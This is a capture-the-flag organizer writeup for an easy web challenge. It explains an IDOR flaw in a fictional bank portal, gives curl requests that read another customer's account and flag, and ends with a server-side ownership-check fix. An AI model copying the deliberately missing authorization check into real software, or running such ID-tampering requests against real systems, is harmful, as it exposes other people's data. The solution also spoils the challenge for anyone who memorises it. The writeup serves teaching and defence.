# WEB-02 — Organizer Writeup (spoilers)

> **Do not distribute.** This file contains the solution. The participant-facing
> material lives in `challenge.yml` → `public.description` and
> `release/README.txt`.

## Challenge summary

Northstar Bank's customer portal authenticates users correctly but never checks
that the requested account belongs to the authenticated customer. The account
API is addressed by account number, and changing `1001` to `1002` returns
Jordan Lee's full account record — including the flag injected at container
start.

| | |
|---|---|
| Category | Web |
| Difficulty | Easy |
| Points | 50 |
| Vulnerability | IDOR / Broken Object-Level Authorization (CWE-639) |
| Vulnerable endpoints | `GET /api/accounts/:id`, `GET /api/accounts/:id/transactions` |
| Participant account | `alex` / `Northstar@2026` (account 1001) |
| Target account | `1002` (Jordan Lee) |
| Flag location | `flag` property of the account 1002 JSON response |

## Vulnerability explanation

`src/server.js` registers both account routes behind `requireAuth`, so the
caller must have a valid session. The handlers then look the account up purely
by the URL parameter:

```js
function getAccountByIdor(req, res) {
  const { id } = req.params;
  ...
  res.json(findAccount(id));
}
```

There is no comparison between `req.user.accountId` (1001) and the requested
`id` (1002). Authentication is enforced; object-level authorization is not.

The same missing check applies to the transactions endpoint, so the target's
transaction history is also readable. Only the account object carries the flag.

The behaviour is deliberately isolated in the two handlers marked
`INTENTIONAL CTF VULNERABILITY` in `src/server.js`; no other route is affected.

## Intended solution

1. Open the portal and sign in with `alex` / `Northstar@2026`.
2. The dashboard loads `/api/session` and then `/api/accounts/1001` (plus the
   transactions endpoint). The account number is visible in the URL.
3. Change `1001` to `1002` in the request (browser devtools, curl, or the URL
   bar). The server returns Jordan Lee's account and the `flag` field.
4. Submit the `AXUM{...}` value in GZ::CTF.

### Example requests

```bash
TARGET=http://<instance>
JAR=$(mktemp)

# sign in
curl -s -c "$JAR" -o /dev/null \
  -d 'username=alex&password=Northstar@2026' "$TARGET/login"

# own account (the request the dashboard makes)
curl -s -b "$JAR" "$TARGET/api/accounts/1001"

# IDOR: another customer's account
curl -s -b "$JAR" "$TARGET/api/accounts/1002"
```

Optional: the same applies to the target's transactions.

```bash
curl -s -b "$JAR" "$TARGET/api/accounts/1002/transactions"
```

### Example response structure

```json
{
  "id": 1002,
  "accountNumber": "1002",
  "customer": {
    "name": "Jordan Lee",
    "email": "jordan@example.test",
    "phone": "+1 (212) 555-0188",
    "address": "900 Park Avenue, New York, NY 10021",
    "customerSince": "2014-08-02"
  },
  "type": "Private Banking",
  "currency": "USD",
  "balance": 1284905.6,
  "availableBalance": 1279905.6,
  "status": "Active",
  "openedAt": "2014-08-02",
  "branch": "Northstar Private Office",
  "iban": "NB-1002-7731-0094",
  "card": { "network": "Northstar Signature", "last4": "8802", "expires": "04/28" },
  "flag": "AXUM{not_your_account_<team-hash>}"
}
```

The `flag` property exists only on account 1002 and only in memory. It is
injected by `accounts.attachCompetitionFlag()` from `process.env.GZCTF_FLAG` at
startup.

## Root cause

The application treats authentication as sufficient authorization. Object
access is keyed on a client-supplied identifier (`:id`) without binding that
identifier to the authenticated principal. This is the classic BOLA/IDOR
pattern: `/objects/{id}` instead of `/users/{me}/objects/{id}`.

## Real-world remediation

Enforce object-level authorization **server-side on every access**, not in the
UI and not by hiding identifiers:

```js
app.get('/api/accounts/:id', requireAuth, (req, res) => {
  const account = findAccount(req.params.id);

  if (!account) return res.status(404).json({ error: 'Account not found' });

  if (account.id !== Number(req.user.accountId)) {
    // Do not reveal whether the object exists for someone else.
    return res.status(404).json({ error: 'Account not found' });
  }

  res.json(account);
});
```

Additional defence in depth:

* derive the account id from the session (`/api/accounts/me`) instead of
  accepting it from the client;
* centralise the ownership check in one helper and call it from every route
  that touches account data;
* add regression tests that request another user's object and expect 403/404;
* log and alert on repeated cross-account access attempts.

## Notes for organizers

* The flag is visible only through the authenticated IDOR response. The login
  page, dashboard HTML, CSS, JS, health endpoint and server logs are clean
  (verified — see `organizer/TESTING.md`).
* The challenge is guided: the dashboard's own request demonstrates the API
  shape, and the account number is user-visible, so a beginner can change one
  digit. No source access or tooling beyond a browser is required.
